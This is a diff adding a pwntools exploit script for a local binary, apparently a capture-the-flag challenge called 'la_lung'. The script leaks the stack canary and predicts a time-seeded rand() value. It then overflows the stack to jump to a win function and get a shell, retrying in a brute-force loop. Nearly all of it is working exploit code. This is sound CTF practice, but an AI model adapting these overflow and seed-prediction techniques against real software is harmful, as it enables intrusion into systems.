@@ -1,0 +1,54 @@
+from pwn import *
+import math
+from ctypes import CDLL
+
+# the only important here is the bad seed exploit then bof
+# note: CDLL, time.time(), ctypes libraby in python
+# original solution belong to Gnas, i just add the brute forces
+# try to make the different time between srand(seed) in execute file and srand(seed) in script is small as possible
+# brute forces, and if it still doesnt success try +- 1, 2, 3, 4, .. second to the seed
+
+#p = process("./la_lung")
+'''
+p = gdb.debug("./la_lung", gdbscript = 
+break *magicHere + 29
+r
+)
+'''
+
+e = ELF("./la_lung")
+libc = CDLL("libc.so.6")
+
+while(True):
+    p = process("./la_lung")
+    
+    payload = b"A" * 64
+    p.sendlineafter(b"name: ", payload)
+    p.recvuntil(payload + b"X")
+    canary = u64(p.recv(7).rjust(8, b"\x00"))
+
+    now = int(math.floor(time.time()))
+    libc.srand(now)
+    payload = str(libc.rand()).encode()
+    p.sendlineafter(b"Door\n", payload)
+    
+    p.recvuntil(b"did it ")
+    win = int(p.recvline(), 16)
+
+    ret = (win - e.symbols['win']) + 0x000000000000101a
+    payload = b"A" * 0x58 + p64(canary) + b"B" * 8 + p64(ret) + p64(win)
+    p.sendlineafter(b"<3\n", payload)
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil(b"vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+print(hex(canary), hex(win))
+
+p.interactive()
